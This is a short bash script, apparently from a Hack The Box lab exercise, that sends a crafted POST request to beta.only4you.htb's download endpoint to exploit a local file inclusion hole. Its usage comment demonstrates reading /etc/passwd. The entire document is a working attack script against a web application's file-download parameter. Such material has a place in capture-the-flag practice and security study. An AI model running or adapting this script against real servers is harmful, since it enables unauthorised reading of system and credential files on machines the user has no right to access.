#!/bin/bash
curl -i -X POST -H "Host: beta.only4you.htb" -H "Content-Type: application/x-www-form-urlencoded" -d "image="$1 http://beta.only4you.htb/download

# usage ./lfi.sh /etc/passwd
